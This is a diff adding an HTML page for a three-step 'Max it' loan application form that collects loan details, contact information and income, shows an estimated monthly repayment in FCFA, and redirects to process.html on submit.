@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Max it - Secure Loan Application</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+         :root {
+            --orange: #FF7900;
+            --orange-hover: #e66a00;
+            --dark: #1a1a1a;
+            --text-gray: #4a5568;
+            --border-color: #cbd5e1;
+            --glass-bg: rgba(255, 255, 255, 0.7);
+            --glass-border: rgba(255, 255, 255, 0.8);
+            --glass-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.1);
+            --error-red: #ef4444;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        body {
+            background-color: #f0f4f8;
+            color: var(--dark);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+            overflow-x: hidden;
+            position: relative;
+        }
+        /* Animated Background Orbs */
+        
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            z-index: -1;
+            animation: float 15s infinite alternate ease-in-out;
+        }
+        
+        .orb-1 {
+            width: 400px;
+            height: 400px;
+            background: rgba(255, 121, 0, 0.3);
+            top: -10%;
+            left: -5%;
+        }
+        
+        .orb-2 {
+            width: 350px;
+            height: 350px;
+            background: rgba(0, 150, 255, 0.2);
+            bottom: -5%;
+            right: -5%;
+            animation-delay: -5s;
+        }
+        
+        @keyframes float {
+            0% {
+                transform: translate(0, 0) scale(1);
+            }
+            100% {
+                transform: translate(30px, -50px) scale(1.1);
+            }
+        }
+        /* Glassmorphic Form Card */
+        
+        .form-container {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            box-shadow: var(--glass-shadow);
+            width: 100%;
+            max-width: 500px;
+            border-radius: 24px;
+            padding: 40px;
+            position: relative;
+            overflow: hidden;
+        }
+        /* Top Orange Accent */
+        
+        .form-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 6px;
+            background: var(--orange);
+        }
+        /* Header & Progress */
+        
+        .form-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .form-header h2 {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 8px;
+        }
+        
+        .form-header p {
+            font-size: 14px;
+            color: var(--text-gray);
+            margin-bottom: 20px;
+        }
+        
+        .progress-bar {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .progress-segment {
+            height: 6px;
+            width: 33%;
+            background-color: rgba(0, 0, 0, 0.05);
+            border-radius: 10px;
+            transition: all 0.4s ease;
+        }
+        
+        .progress-segment.active {
+            background-color: var(--orange);
+            box-shadow: 0 0 8px rgba(255, 121, 0, 0.4);
+        }
+        /* Form Elements */
+        
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-gray);
+            margin-bottom: 8px;
+        }
+        /* Input with Icons */
+        
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        
+        .input-wrapper i {
+            position: absolute;
+            left: 15px;
+            color: #94a3b8;
+            font-size: 14px;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 14px 15px 14px 40px;
+            border: 2px solid transparent;
+            border-radius: 12px;
+            font-size: 15px;
+            color: var(--dark);
+            background-color: rgba(255, 255, 255, 0.9);
+            outline: none;
+            transition: all 0.3s;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.02);
+        }
+        
+        select.form-control,
+        textarea.form-control {
+            padding-left: 15px;
+        }
+        
+        .form-control:focus {
+            border-color: var(--orange);
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(255, 121, 0, 0.1);
+        }
+        
+        .form-control.error {
+            border-color: var(--error-red);
+        }
+        
+        textarea.form-control {
+            resize: vertical;
+            min-height: 100px;
+        }
+        /* Phone Input Specifics */
+        
+        .phone-input-group {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .country-code {
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 12px;
+            padding: 0 15px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--dark);
+        }
+        
+        .phone-input-group .form-control {
+            padding-left: 15px;
+        }
+        /* Summary Box (Step 3) */
+        
+        .summary-box {
+            background: rgba(255, 255, 255, 0.9);
+            border-left: 4px solid var(--orange);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.03);
+        }
+        
+        .summary-box h4 {
+            font-size: 16px;
+            margin-bottom: 15px;
+            font-weight: 800;
+        }
+        
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 14px;
+            border-bottom: 1px dashed #e2e8f0;
+            padding-bottom: 8px;
+        }
+        
+        .summary-row:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+        
+        .summary-label {
+            color: var(--text-gray);
+        }
+        
+        .summary-value {
+            color: var(--dark);
+            font-weight: 600;
+            text-align: right;
+        }
+        
+        .highlight-value {
+            color: var(--orange);
+            font-size: 18px;
+            font-weight: 800;
+        }
+        /* Buttons */
+        
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 30px;
+        }
+        
+        .btn {
+            flex: 1;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .btn-primary {
+            background-color: var(--orange);
+            color: white;
+            box-shadow: 0 4px 15px rgba(255, 121, 0, 0.3);
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 121, 0, 0.4);
+        }
+        
+        .btn-secondary {
+            background-color: rgba(0, 0, 0, 0.05);
+            color: var(--text-gray);
+        }
+        
+        .btn-secondary:hover {
+            background-color: rgba(0, 0, 0, 0.1);
+            color: var(--dark);
+        }
+        /* Step Visibility with Animations */
+        
+        .form-step {
+            display: none;
+            opacity: 0;
+            transform: translateX(20px);
+            transition: all 0.4s ease-in-out;
+        }
+        
+        .form-step.active {
+            display: block;
+            opacity: 1;
+            transform: translateX(0);
+        }
+        
+        .error-msg {
+            color: var(--error-red);
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+
+    <div class="form-container">
+        <div class="form-header">
+            <h2>Loan Application</h2>
+            <p id="step-indicator">Step 1: Loan Details</p>
+            <div class="progress-bar">
+                <div class="progress-segment active" id="prog-1"></div>
+                <div class="progress-segment" id="prog-2"></div>
+                <div class="progress-segment" id="prog-3"></div>
+            </div>
+        </div>
+
+        <form id="loanForm">
+
+            <div class="form-step active" id="step-1">
+                <div class="form-group">
+                    <label>Loan Type</label>
+                    <select class="form-control" id="loanType" required>
+                        <option value="" disabled selected>Select a loan type...</option>
+                        <option value="Personal Loan">Personal Loan</option>
+                        <option value="Business/SME Loan">Business/SME Loan</option>
+                        <option value="Education/Student Loan">Education/Student Loan</option>
+                        <option value="Emergency/Medical Loan">Emergency/Medical Loan</option>
+                        <option value="Home Improvement">Home Improvement</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Loan Amount (FCFA)</label>
+                    <div class="input-wrapper">
+                        <i class="fa-solid fa-money-bill-wave"></i>
+                        <input type="number" class="form-control" id="loanAmount" placeholder="e.g. 100000" min="10000" max="2000000" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Repayment Term</label>
+                    <select class="form-control" id="loanTerm" required>
+                        <option value="" disabled selected>Select duration...</option>
+                        <option value="3">3 Months</option>
+                        <option value="6">6 Months</option>
+                        <option value="9">9 Months</option>
+                        <option value="12">12 Months (1 Year)</option>
+                        <option value="18">18 Months</option>
+                        <option value="24">24 Months (2 Years)</option>
+                        <option value="36">36 Months (3 Years)</option>
+                        <option value="48">48 Months (4 Years)</option>
+                        <option value="60">60 Months (5 Years)</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Brief Purpose of Loan</label>
+                    <textarea class="form-control" id="loanPurpose" placeholder="Tell us briefly how you plan to use these funds..." required></textarea>
+                </div>
+
+                <div class="button-group">
+                    <button type="button" class="btn btn-primary" onclick="nextStep(1)">Next Step <i class="fa-solid fa-arrow-right"></i></button>
+                </div>
+            </div>
+
+            <div class="form-step" id="step-2">
+                <div class="form-group">
+                    <label>First Name</label>
+                    <div class="input-wrapper">
+                        <i class="fa-regular fa-user"></i>
+                        <input type="text" class="form-control" id="firstName" placeholder="Legal First Name" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Last Name</label>
+                    <div class="input-wrapper">
+                        <i class="fa-regular fa-user"></i>
+                        <input type="text" class="form-control" id="lastName" placeholder="Legal Last Name" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Email Address</label>
+                    <div class="input-wrapper">
+                        <i class="fa-regular fa-envelope"></i>
+                        <input type="email" class="form-control" id="email" placeholder="you@example.com" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Orange Phone Number</label>
+                    <div class="phone-input-group">
+                        <div class="country-code">+237</div>
+                        <input type="tel" class="form-control" id="phone" placeholder="671234567" maxlength="9" pattern="[0-9]{9}" required>
+                    </div>
+                </div>
+
+                <div class="button-group">
+                    <button type="button" class="btn btn-secondary" onclick="prevStep(2)"><i class="fa-solid fa-arrow-left"></i> Back</button>
+                    <button type="button" class="btn btn-primary" onclick="nextStep(2)">Next Step <i class="fa-solid fa-arrow-right"></i></button>
+                </div>
+            </div>
+
+            <div class="form-step" id="step-3">
+                <div class="form-group">
+                    <label>Employment Status</label>
+                    <select class="form-control" id="empStatus" required>
+                        <option value="" disabled selected>Select status...</option>
+                        <option value="Full-Time Employed">Full-Time Employed</option>
+                        <option value="Part-Time Employed">Part-Time Employed</option>
+                        <option value="Self-Employed / Freelance">Self-Employed / Freelance</option>
+                        <option value="Business Owner">Business Owner</option>
+                        <option value="Student">Student</option>
+                        <option value="Retired">Retired</option>
+                        <option value="Unemployed">Unemployed</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Industry / Sector</label>
+                    <select class="form-control" id="empSector" required>
+                        <option value="" disabled selected>Select industry...</option>
+                        <option value="Technology & IT">Technology & IT</option>
+                        <option value="Healthcare & Medical">Healthcare & Medical</option>
+                        <option value="Education">Education</option>
+                        <option value="Finance & Banking">Finance & Banking</option>
+                        <option value="Retail & Trade">Retail & Trade</option>
+                        <option value="Construction & Real Estate">Construction & Real Estate</option>
+                        <option value="Government & Public Sector">Government & Public Sector</option>
+                        <option value="Agriculture">Agriculture</option>
+                        <option value="Other">Other</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Estimated Monthly Income (FCFA)</label>
+                    <div class="input-wrapper">
+                        <i class="fa-solid fa-wallet"></i>
+                        <input type="number" class="form-control" id="monthlyIncome" placeholder="e.g. 150000" required>
+                    </div>
+                </div>
+
+                <div class="summary-box">
+                    <h4><i class="fa-solid fa-file-invoice-dollar" style="color: var(--orange); margin-right: 8px;"></i> Application Summary</h4>
+                    <div class="summary-row">
+                        <span class="summary-label">Applicant:</span>
+                        <span class="summary-value" id="sum-name">-</span>
+                    </div>
+                    <div class="summary-row">
+                        <span class="summary-label">Loan Request:</span>
+                        <span class="summary-value" id="sum-amount">-</span>
+                    </div>
+                    <div class="summary-row">
+                        <span class="summary-label">Duration:</span>
+                        <span class="summary-value" id="sum-term">-</span>
+                    </div>
+                    <div class="summary-row">
+                        <span class="summary-label">Est. Monthly Repayment:</span>
+                        <span class="summary-value highlight-value" id="sum-emi">-</span>
+                    </div>
+                </div>
+
+                <div class="button-group">
+                    <button type="button" class="btn btn-secondary" onclick="prevStep(3)"><i class="fa-solid fa-arrow-left"></i> Back</button>
+                    <button type="button" class="btn btn-primary" id="submitBtn" onclick="submitApplication()">Confirm & Apply <i class="fa-solid fa-check"></i></button>
+                </div>
+            </div>
+
+        </form>
+    </div>
+
+    <script>
+        const stepTitles = ["Step 1: Loan Details", "Step 2: Personal Info", "Step 3: Financial Profile"];
+        const ANNUAL_INTEREST_RATE = 0.18; // 18% used for calculations
+
+        function validateCurrentStep(stepNumber) {
+            const currentStep = document.getElementById(`step-${stepNumber}`);
+            const inputs = currentStep.querySelectorAll('input[required], select[required], textarea[required]');
+            let isValid = true;
+
+            inputs.forEach(input => {
+                if (!input.value.trim()) {
+                    input.classList.add('error');
+                    isValid = false;
+                } else {
+                    input.classList.remove('error');
+                }
+            });
+
+            if (!isValid) {
+                alert("Please fill in all required fields before continuing.");
+            }
+            return isValid;
+        }
+
+        function updateUI(step) {
+            document.querySelectorAll('.form-step').forEach(el => {
+                el.classList.remove('active');
+                setTimeout(() => el.style.display = 'none', 400);
+            });
+
+            const targetEl = document.getElementById(`step-${step}`);
+            setTimeout(() => {
+                targetEl.style.display = 'block';
+                void targetEl.offsetWidth;
+                targetEl.classList.add('active');
+            }, 400);
+
+            document.getElementById('step-indicator').innerText = stepTitles[step - 1];
+
+            for (let i = 1; i <= 3; i++) {
+                const seg = document.getElementById(`prog-${i}`);
+                if (i <= step) {
+                    seg.classList.add('active');
+                } else {
+                    seg.classList.remove('active');
+                }
+            }
+        }
+
+        function nextStep(currentStep) {
+            if (!validateCurrentStep(currentStep)) return;
+
+            const next = currentStep + 1;
+            if (next === 3) {
+                populateSummary();
+            }
+            updateUI(next);
+        }
+
+        function prevStep(currentStep) {
+            updateUI(currentStep - 1);
+        }
+
+        function populateSummary() {
+            const amount = parseFloat(document.getElementById('loanAmount').value);
+            const months = parseInt(document.getElementById('loanTerm').value);
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+
+            let emi = 0;
+            if (amount && months) {
+                const r = ANNUAL_INTEREST_RATE / 12;
+                emi = (amount * r * Math.pow(1 + r, months)) / (Math.pow(1 + r, months) - 1);
+            }
+
+            document.getElementById('sum-name').innerText = `${firstName} ${lastName}`;
+            document.getElementById('sum-amount').innerText = `${amount.toLocaleString()} FCFA`;
+            document.getElementById('sum-term').innerText = `${months} Months`;
+            document.getElementById('sum-emi').innerText = `${Math.round(emi).toLocaleString()} FCFA`;
+        }
+
+        function submitApplication() {
+            if (!validateCurrentStep(3)) return;
+
+            const btn = document.getElementById('submitBtn');
+            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Processing...';
+            btn.style.opacity = '0.8';
+            btn.disabled = true;
+
+            setTimeout(() => {
+                window.location.href = 'process.html';
+            }, 1500);
+        }
+
+        document.querySelectorAll('.form-control').forEach(input => {
+            input.addEventListener('input', function() {
+                this.classList.remove('error');
+            });
+        });
+    </script>
+</body>
+
+</html>
